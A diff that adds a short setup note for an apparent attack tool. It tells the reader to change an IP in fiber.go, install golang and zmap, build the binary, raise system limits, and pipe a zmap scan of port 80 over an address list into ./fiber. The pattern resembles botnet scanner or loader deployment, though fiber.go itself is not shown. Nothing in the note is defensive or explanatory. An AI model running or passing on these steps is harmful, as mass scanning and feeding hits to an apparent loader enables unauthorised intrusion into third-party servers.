@@ -1,0 +1,6 @@
+CHANGE IP IN fiber.go
+
+yum install golang -y
+yum install zmap -y
+go build fiber.go
+ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q | ./fiber 80
